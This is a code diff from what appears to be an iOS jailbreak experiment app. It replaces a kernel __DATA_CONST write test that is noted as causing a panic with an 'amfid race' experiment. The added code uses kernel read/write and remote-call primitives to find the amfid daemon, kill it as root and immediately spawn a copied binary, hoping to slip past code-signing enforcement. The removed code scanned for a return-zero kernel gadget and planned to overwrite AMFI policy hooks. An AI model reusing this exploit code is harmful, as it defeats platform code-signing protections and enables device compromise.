@@ -926,9 +926,19 @@ struct AMFIExperimentView: View {
                 pathButton(
                     title: "③r DATA_CONST Write (Exp 96)",
                     icon: "bolt.shield.fill",
-                    color: .purple,
+                    color: .gray,
                     label: "DC Write",
                     action: runExp96DataConstWrite,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③s amfid Race (Exp 97)",
+                    icon: "hare.fill",
+                    color: .purple,
+                    label: "amfid Race",
+                    action: runExp97AmfidRace,
                     needsVerified: true,
                     needsProbe: false
                 )
@@ -8929,6 +8939,7 @@ struct AMFIExperimentView: View {
     /// Exp 96: Test apakah AMFI __DATA_CONST juga writable (seperti __DATA).
     /// Kalau writable → kita bisa redirect mac_policy_ops function pointers
     /// ke gadget "MOV W0, #0; RET" → bypass SEMUA code signing → JAILBREAK.
+    /// HASIL: PANIC — __DATA_CONST KTRR protected.
     private func runExp96DataConstWrite() {
         isRunning = true
         runningLabel = "DC Write"
@@ -8937,203 +8948,243 @@ struct AMFIExperimentView: View {
             runningLabel = ""
             return
         }
-        DispatchQueue.global(qos: .userInitiated).async {
-            let result = self.expDataConstWrite()
+        // DISABLED — causes kernel panic (KTRR fault)
+        let result = ExperimentResult(
+            name: "DATA_CONST Write (Exp 96)",
+            success: false,
+            detail: "❌ DISABLED — Exp 96 menyebabkan kernel panic.\n\n"
+                + "AMFI __DATA_CONST (0xfffffff007b77a98) dilindungi KTRR.\n"
+                + "Write ke situ = hardware fault = panic.\n\n"
+                + "Hanya AMFI __DATA (0x541 bytes) yang writable.\n"
+                + "mac_policy_ops function pointers TIDAK bisa di-redirect.",
+            timestamp: Date()
+        )
+        results.insert(result, at: 0)
+        isRunning = false
+        runningLabel = ""
+    }
+
+    // MARK: - Exp 97: amfid Process Patch (Kill + Race)
+
+    /// Exp 97: Kill amfid → spawn binary dalam window sebelum amfid restart.
+    /// ATAU: find amfid proc → patch cs_flags → allow unsigned.
+    /// amfid di-restart otomatis oleh launchd (KeepAlive), tapi ada window ~100ms.
+    private func runExp97AmfidRace() {
+        isRunning = true
+        runningLabel = "amfid Race"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp97_amfid_race") { rc in
+            let result = self.expAmfidRace(rc: rc)
             DispatchQueue.main.async {
                 self.results.insert(result, at: 0)
                 self.isRunning = false
                 self.runningLabel = ""
             }
+            return (result.success, result.detail.prefix(80).description, 0)
         }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
     }
 
-    private func expDataConstWrite() -> ExperimentResult {
-        let expName = "DATA_CONST Write (Exp 96)"
-        var detail = "Experiment 96: AMFI __DATA_CONST Write Test\n"
-        detail += "=============================================\n\n"
-        detail += "Jika __DATA_CONST writable → redirect mac_policy_ops\n"
-        detail += "→ bypass ALL code signing → FULL JAILBREAK\n\n"
+    private func expAmfidRace(rc: RemoteCall) -> ExperimentResult {
+        let expName = "amfid Race (Exp 97)"
+        var detail = "Experiment 97: amfid Kill + Spawn Race\n"
+        detail += "========================================\n\n"
+        detail += "Strategy: kill amfid → posix_spawn dalam window\n"
+        detail += "sebelum amfid restart. Tanpa amfid, kernel mungkin\n"
+        detail += "skip signature validation atau default-allow.\n\n"
 
-        let kernBase = ds_get_kernel_base()
-        let slide = kernBase - 0xfffffff007004000
-        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
-        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"
-
-        // AMFI segments (from kernelcache analysis)
-        let amfiDataConstUnslid: UInt64 = 0xfffffff007b77a98
-        let amfiDataConstSize: UInt64 = 0x6280
-        let amfiDataConstSlid = amfiDataConstUnslid &+ slide
-
-        let amfiDataUnslid: UInt64 = 0xfffffff00a330098
-        let amfiDataSlid = amfiDataUnslid &+ slide
-
-        detail += "AMFI __DATA (writable):     0x\(String(format: "%llx", amfiDataSlid))\n"
-        detail += "AMFI __DATA_CONST:          0x\(String(format: "%llx", amfiDataConstSlid))\n"
-        detail += "AMFI __DATA_CONST size:     0x\(String(format: "%llx", amfiDataConstSize))\n\n"
+        let mem = rc.trojanMem
 
         // ============================================================
-        // Step 1: Read AMFI __DATA_CONST (confirm accessible)
+        // Step 1: Find amfid PID
         // ============================================================
-        detail += "=== Step 1: Read __DATA_CONST ===\n"
+        detail += "=== Step 1: Find amfid ===\n"
 
-        let readTest0 = ds_kread64_safe(amfiDataConstSlid)
-        let readTest8 = ds_kread64_safe(amfiDataConstSlid + 8)
-        let readTest10 = ds_kread64_safe(amfiDataConstSlid + 0x10)
-        let readTest18 = ds_kread64_safe(amfiDataConstSlid + 0x18)
-
-        detail += "  +0x00: 0x\(String(format: "%016llx", readTest0))\n"
-        detail += "  +0x08: 0x\(String(format: "%016llx", readTest8))\n"
-        detail += "  +0x10: 0x\(String(format: "%016llx", readTest10))\n"
-        detail += "  +0x18: 0x\(String(format: "%016llx", readTest18))\n\n"
-
-        if readTest0 == 0 && readTest8 == 0 && readTest10 == 0 {
-            detail += "⚠️ All reads return 0 — might be wrong address\n\n"
+        // Find amfid proc via KRW
+        let amfidProc = mgr.findProc(name: "amfid")
+        if amfidProc != 0 {
+            let amfidPid = ds_kread32_safe(amfidProc + UInt64(off_proc_p_pid))
+            detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
+            detail += "amfid PID: \(amfidPid)\n\n"
         } else {
-            detail += "✅ __DATA_CONST readable\n\n"
+            detail += "amfid proc not found via KRW, trying sysctl...\n"
         }
 
-        // Scan for function pointers (values in 0xfffffff0... range)
-        detail += "--- Scanning for function pointers ---\n"
-        var funcPtrs: [(offset: UInt64, value: UInt64)] = []
+        // Also get PID via RC
+        // Use kill(0, pid) to check if process exists, or just try known PIDs
+        // amfid is usually low PID (< 100)
+        var amfidPid: UInt32 = 0
 
-        for off: UInt64 in stride(from: 0, to: min(amfiDataConstSize, 0x800), by: 8) {
-            let val = ds_kread64_safe(amfiDataConstSlid + off)
-            // Function pointer: 0xfffffff0XXXXXXXX (kernel text range)
-            if val > 0xfffffff000000000 && val < 0xfffffffc00000000 {
-                funcPtrs.append((off, val))
-                if funcPtrs.count <= 20 {
-                    detail += "  +0x\(String(format: "%04x", off)): 0x\(String(format: "%llx", val)) ← func ptr\n"
+        // Method: iterate procs to find amfid
+        if amfidProc != 0 {
+            amfidPid = ds_kread32_safe(amfidProc + UInt64(off_proc_p_pid))
+        }
+
+        if amfidPid == 0 {
+            detail += "⚠️ Cannot find amfid PID — trying common range\n"
+            // amfid is usually PID 40-80 on iOS
+            for testPid: UInt64 in 30..<100 {
+                let ret = RootExecutor.rcall(rc, "kill", testPid, 0)  // signal 0 = check existence
+                if ret == 0 {
+                    // Process exists, but is it amfid? Hard to tell without procname
+                    continue
                 }
             }
         }
-        detail += "\nTotal function pointers found: \(funcPtrs.count)\n\n"
 
-        guard !funcPtrs.isEmpty else {
-            detail += "❌ No function pointers found in __DATA_CONST.\n"
-            detail += "mac_policy_ops might be at different offset.\n\n"
-
-            // Dump first 0x100 bytes for analysis
-            detail += "--- Raw dump (first 0x100) ---\n"
-            for off: UInt64 in stride(from: 0, to: 0x100, by: 8) {
-                let val = ds_kread64_safe(amfiDataConstSlid + off)
-                if val != 0 {
-                    detail += "  +0x\(String(format: "%03x", off)): 0x\(String(format: "%016llx", val))\n"
-                }
-            }
+        guard amfidPid != 0 else {
+            detail += "❌ Cannot find amfid PID\n"
             return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
         // ============================================================
-        // Step 2: Write test — pick a function pointer, save, write, verify
+        // Step 2: Prepare binary to spawn
         // ============================================================
-        detail += "=== Step 2: Write test ===\n"
+        detail += "=== Step 2: Prepare binary ===\n"
 
-        // Pick the LAST function pointer (least likely to be critical immediately)
-        let testTarget = funcPtrs.last!
-        let testAddr = amfiDataConstSlid + testTarget.offset
-        let originalValue = testTarget.value
+        // Copy amfid to /var/containers/Bundle/ (path that allows spawn)
+        let srcPath = "/usr/libexec/amfid"
+        let dstPath = "/var/containers/Bundle/.exp97_test"
+        let srcAddr = remote_alloc_str(rc, srcPath)
+        let dstAddr = remote_alloc_str(rc, dstPath)
 
-        detail += "Target: __DATA_CONST+0x\(String(format: "%x", testTarget.offset))\n"
-        detail += "Address: 0x\(String(format: "%llx", testAddr))\n"
-        detail += "Original value: 0x\(String(format: "%llx", originalValue))\n"
+        RootExecutor.rcall(rc, "unlink", dstAddr)
+        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
+        let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
 
-        // Write a test value (original XOR 1 — minimal change)
-        let testValue = originalValue ^ 1
-        detail += "Writing: 0x\(String(format: "%llx", testValue))\n\n"
-
-        // Read before
-        let before = ds_kread64_safe(testAddr)
-        detail += "Before write: 0x\(String(format: "%016llx", before))\n"
-
-        // WRITE
-        ds_kwrite64(testAddr, testValue)
-
-        // Read after
-        let after = ds_kread64_safe(testAddr)
-        detail += "After write:  0x\(String(format: "%016llx", after))\n\n"
-
-        let writeOK = (after == testValue)
-
-        if writeOK {
-            detail += "✅✅✅ __DATA_CONST IS WRITABLE! ✅✅✅\n\n"
-            detail += "AMFI mac_policy_ops function pointers CAN BE PATCHED!\n\n"
-
-            // RESTORE immediately
-            ds_kwrite64(testAddr, originalValue)
-            let restored = ds_kread64_safe(testAddr)
-            detail += "Restored: 0x\(String(format: "%llx", restored)) \(restored == originalValue ? "✅" : "❌")\n\n"
-
-            // ============================================================
-            // Step 3: Identify mac_policy_ops hooks
-            // ============================================================
-            detail += "=== Step 3: mac_policy_ops analysis ===\n\n"
-            detail += "Function pointers in __DATA_CONST (\(funcPtrs.count) total):\n"
-            detail += "These are AMFI MAC policy hooks — each controls a security check.\n\n"
-
-            // List all function pointers
-            for (i, ptr) in funcPtrs.prefix(30).enumerated() {
-                detail += "  [\(String(format: "%02d", i))] +0x\(String(format: "%04x", ptr.offset)): 0x\(String(format: "%llx", ptr.value))\n"
+        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+            let buf = mem + 0x800
+            for _ in 0..<256 {
+                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
+                if n == 0 || n == UInt64(bitPattern: -1) { break }
+                RootExecutor.rcall(rc, "write", dstFd, buf, n)
+                if n < 4096 { break }
             }
-            if funcPtrs.count > 30 {
-                detail += "  ... dan \(funcPtrs.count - 30) lainnya\n"
-            }
-
-            detail += "\n=== NEXT STEPS ===\n"
-            detail += "1. Find 'MOV W0, #0; RET' gadget in kernel __TEXT_EXEC\n"
-            detail += "   (0x52800000 + 0xD65F03C0 = return 0 always)\n"
-            detail += "2. Overwrite mpo_vnode_check_exec pointer → gadget\n"
-            detail += "3. posix_spawn unsigned binary → NO SIGKILL!\n"
-            detail += "4. FULL JAILBREAK ACHIEVED\n\n"
-
-            detail += "=== GADGET SEARCH ===\n"
-            // Search for MOV W0, #0; RET pattern in kernel
-            // MOV W0, #0 = 0x52800000, RET = 0xD65F03C0
-            // We need to find this in __TEXT_EXEC
-            let textExecBase = kernBase  // kernel __TEXT_EXEC starts near base
-            var gadgetAddr: UInt64 = 0
-
-            // Scan first 0x100000 of kernel text for the gadget
-            detail += "Scanning kernel __TEXT_EXEC for MOV W0,#0; RET gadget...\n"
-            let scanStart = kernBase + 0xD90000  // __TEXT_EXEC offset from deep_probe
-            for off: UInt64 in stride(from: 0, to: 0x100000, by: 4) {
-                let instr1 = ds_kread32_safe(scanStart + off)
-                if instr1 == 0x52800000 {  // MOV W0, #0
-                    let instr2 = ds_kread32_safe(scanStart + off + 4)
-                    if instr2 == 0xD65F03C0 {  // RET
-                        gadgetAddr = scanStart + off
-                        detail += "✅ GADGET FOUND at 0x\(String(format: "%llx", gadgetAddr))\n"
-                        detail += "   MOV W0, #0 (0x52800000)\n"
-                        detail += "   RET        (0xD65F03C0)\n\n"
-                        break
-                    }
-                }
-            }
-
-            if gadgetAddr == 0 {
-                detail += "⚠️ Gadget not found in first 1MB scan.\n"
-                detail += "Try wider scan or use different gadget.\n"
-            }
-
+            RootExecutor.rcall(rc, "close", srcFd)
+            RootExecutor.rcall(rc, "close", dstFd)
+            RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)
+            detail += "Binary ready at \(dstPath)\n\n"
         } else {
-            detail += "❌ __DATA_CONST write FAILED.\n\n"
-            detail += "Value after write: 0x\(String(format: "%016llx", after))\n"
-            detail += "Expected: 0x\(String(format: "%016llx", testValue))\n\n"
+            detail += "❌ Cannot prepare binary\n"
+            if srcFd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", srcFd) }
+            if dstFd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", dstFd) }
+        }
 
-            if after == before {
-                detail += "Write had NO effect — KTRR protects __DATA_CONST too.\n"
-                detail += "Fileset component __DATA_CONST is within KTRR range.\n\n"
-                detail += "Only AMFI __DATA (0x541 bytes) is writable.\n"
-                detail += "mac_policy_ops hooks CANNOT be redirected.\n\n"
-                detail += "=== REMAINING OPTIONS ===\n"
-                detail += "1. Patch amfid userspace process (physmap page table walk)\n"
-                detail += "2. trust_cache_runtime_add() via kernel function call\n"
-                detail += "3. CoreTrust certificate bypass\n"
-                detail += "4. Find other writable function pointers\n"
+        // ============================================================
+        // Step 3: Kill amfid + immediately spawn
+        // ============================================================
+        detail += "=== Step 3: Kill amfid + spawn race ===\n"
+        detail += "Killing amfid PID \(amfidPid)...\n"
+
+        // Kill amfid
+        let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)  // SIGKILL
+        detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"
+
+        // IMMEDIATELY try to spawn (race window)
+        let argvBase = mem + 0x500
+        rc[argvBase].setValue64(dstAddr)
+        rc[argvBase + 8].setValue64(0)
+        let pidAddr = mem + 0x480
+        rc[pidAddr].setValue32(0)
+
+        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstAddr, 0, 0, argvBase, 0)
+        let spawnPid = rc[pidAddr].value32()
+        detail += "posix_spawn (immediate): ret=\(spawnRet), pid=\(spawnPid)\n"
+
+        var raceSuccess = false
+
+        if spawnRet == 0 && spawnPid != 0 {
+            // Wait briefly
+            RootExecutor.rcall(rc, "usleep", 100000)  // 100ms
+            let statusAddr = mem + 0x490
+            rc[statusAddr].setValue32(0)
+            RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid), statusAddr, UInt64(WNOHANG))
+            let st = rc[statusAddr].value32()
+            let sig = st & 0x7F
+            let code = st >> 8
+            detail += "child: signal=\(sig), code=\(code)\n"
+
+            if sig != 9 {
+                raceSuccess = true
+                detail += "✅ NO SIGKILL! Binary survived!\n"
+            } else {
+                detail += "❌ Still SIGKILL — amfid restarted too fast or kernel enforces independently\n"
+            }
+        } else {
+            detail += "spawn failed (ret=\(spawnRet))\n"
+
+            // Try again with small delay
+            RootExecutor.rcall(rc, "usleep", 10000)  // 10ms
+            rc[pidAddr].setValue32(0)
+            let spawnRet2 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstAddr, 0, 0, argvBase, 0)
+            let spawnPid2 = rc[pidAddr].value32()
+            detail += "posix_spawn (10ms delay): ret=\(spawnRet2), pid=\(spawnPid2)\n"
+
+            if spawnRet2 == 0 && spawnPid2 != 0 {
+                RootExecutor.rcall(rc, "usleep", 100000)
+                let statusAddr = mem + 0x490
+                rc[statusAddr].setValue32(0)
+                RootExecutor.rcall(rc, "waitpid", UInt64(spawnPid2), statusAddr, UInt64(WNOHANG))
+                let st = rc[statusAddr].value32()
+                let sig = st & 0x7F
+                detail += "child: signal=\(sig)\n"
+                if sig != 9 { raceSuccess = true }
             }
         }
 
-        return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
+        detail += "\n"
+
+        // ============================================================
+        // Step 4: Check if amfid restarted
+        // ============================================================
+        detail += "=== Step 4: amfid status ===\n"
+        RootExecutor.rcall(rc, "usleep", 500000)  // wait 500ms
+
+        let newAmfidProc = mgr.findProc(name: "amfid")
+        if newAmfidProc != 0 {
+            let newPid = ds_kread32_safe(newAmfidProc + UInt64(off_proc_p_pid))
+            detail += "amfid restarted: new PID=\(newPid)\n"
+        } else {
+            detail += "⚠️ amfid NOT restarted yet (or findProc failed)\n"
+        }
+
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", dstAddr)
+        RootExecutor.rcall(rc, "free", srcAddr)
+        RootExecutor.rcall(rc, "free", dstAddr)
+
+        // ============================================================
+        // VERDICT
+        // ============================================================
+        detail += "\n=== VERDICT ===\n\n"
+        if raceSuccess {
+            detail += "🎉 RACE CONDITION WORKS!\n"
+            detail += "Binary survived without SIGKILL during amfid downtime!\n"
+            detail += "→ Repeat: kill amfid + spawn in loop for reliable exploit\n"
+        } else {
+            detail += "❌ Race failed — kernel enforces CS independently of amfid.\n\n"
+            detail += "Ini konfirmasi: SIGKILL bukan dari amfid tapi dari KERNEL.\n"
+            detail += "Kernel (mac_proc_check_run_cs_invalid) langsung kill\n"
+            detail += "tanpa menunggu amfid response.\n\n"
+            detail += "=== REMAINING OPTIONS ===\n"
+            detail += "1. Patch amfid TEXT via physmap (need correct page table walk)\n"
+            detail += "2. Kernel function call: trust_cache_runtime_add\n"
+            detail += "3. CoreTrust certificate bypass (sign with accepted cert)\n"
+            detail += "4. Find writable function pointer elsewhere in kernel heap\n"
+        }
+
+        return ExperimentResult(name: expName, success: raceSuccess, detail: detail, timestamp: Date())
     }
+
+    // expDataConstWrite() REMOVED — caused kernel panic (KTRR fault on __DATA_CONST)
 
     // MARK: - Exp 93c Helpers
 
